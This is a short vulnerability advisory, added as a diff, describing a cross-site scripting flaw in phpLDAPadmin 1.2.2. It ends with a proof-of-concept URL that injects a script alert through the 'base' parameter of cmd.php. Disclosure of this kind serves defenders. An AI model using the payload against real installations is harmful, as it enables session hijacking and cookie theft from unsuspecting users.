@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/51793/info
+
+phpLDAPadmin is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+phpLDAPadmin 1.2.2 is affected; other versions may also be vulnerable. 
+
+http://www.example.com/phpldapadmin/htdocs/cmd.php?cmd=query_engine&server_id=1&query=none&format=list&showresults=na&base=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&scope=sub&
+filter=objectClass%3D* display_attrs=cn%2C+sn%2C+uid%2C+postalAddress%2C+telephoneNumber&orderby=&size_limit=50&search=Search 
